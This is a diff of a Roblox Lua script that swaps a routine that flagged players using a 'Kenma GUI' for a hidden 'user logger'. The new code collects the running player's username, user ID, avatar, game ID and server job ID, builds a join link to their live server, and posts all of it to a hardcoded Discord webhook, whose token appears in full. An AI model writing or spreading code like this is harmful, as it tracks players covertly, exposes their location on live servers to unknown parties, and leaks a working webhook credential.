@@ -1,50 +1,77 @@
--- Script B (LocalScript - For detection)
-
 local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
 
-local function checkCharacter(player, character)
-    local existing = character:FindFirstChild("KenmaUser")
-    if existing then
-        warn(player.Name .. " is using the script.")
-        game.StarterGui:SetCore("ChatMakeSystemMessage", {
-            Text = player.Name .. " is using the Kenma GUI.",
-            Color = Color3.fromRGB(255, 100, 100),
-            Font = Enum.Font.SourceSansBold,
-            FontSize = Enum.FontSize.Size24,
-        })
-    end
+local localPlayer = Players.LocalPlayer or Players:GetPlayers()[1]
+local username = localPlayer.Name
+local userId = localPlayer.UserId
+local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+local jobId = game.JobId
+local gameId = tostring(game.GameId)
 
-    character.ChildAdded:Connect(function(child)
-        if child.Name == "KenmaUser" then
-            warn(player.Name .. " is now using the script.")
-            game.StarterGui:SetCore("ChatMakeSystemMessage", {
-                Text = player.Name .. " just started using the Kenma GUI.",
-                Color = Color3.fromRGB(255, 0, 0),
-                Font = Enum.Font.SourceSansBold,
-                FontSize = Enum.FontSize.Size24,
-            })
-        end
-    end)
-end
+local joinUri = "roblox://experiences/start?placeId=" .. gameId .. "&gameInstanceId=" .. jobId
 
-local function monitorPlayer(player)
-    player.CharacterAdded:Connect(function(character)
-        checkCharacter(player, character)
-    end)
+local url = "https://discord.com/api/webhooks/1388425981399797850/RM5zi4-cHNdX75mk5nH13RPsJUL4OWsciI6lUgWkPzk3Gh67py2MMza_YkczWf9V1OXp"
 
-    if player.Character then
-        checkCharacter(player, player.Character)
-    end
-end
+local embed = {
+    title = "Script Has Been Executed",
+    color = 3447003,
+    thumbnail = {
+        url = avatarUrl
+    },
+    fields = {
+        {
+            name = "Username",
+            value = username,
+            inline = true
+        },
+        {
+            name = "User ID",
+            value = tostring(userId),
+            inline = true
+        },
+        {
+            name = "Game ID",
+            value = gameId,
+            inline = false
+        },
+        {
+            name = "Job ID",
+            value = jobId,
+            inline = false
+        },
+        {
+            name = "Join Server",
+            value = "roblox://experiences/start?placeId=" .. gameId .. "&gameInstanceId=" .. jobId .. "  ",
+            inline = false
+        }
+    },
+    footer = {
+        text = "user logger"
+    },
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
 
-for _, player in ipairs(Players:GetPlayers()) do
-    if player ~= Players.LocalPlayer then
-        monitorPlayer(player)
-    end
-end
+local payload = {
+    embeds = { embed }
+}
 
-Players.PlayerAdded:Connect(function(player)
-    if player ~= Players.LocalPlayer then
-        monitorPlayer(player)
-    end
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+
+local body = HttpService:JSONEncode(payload)
+
+local success, response = pcall(function()
+    return http_request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
 end)
+
+if success then
+    print("✅ Webhook with embed and join link sent!")
+else
+    warn("❌ Failed to send webhook:", response)
+end
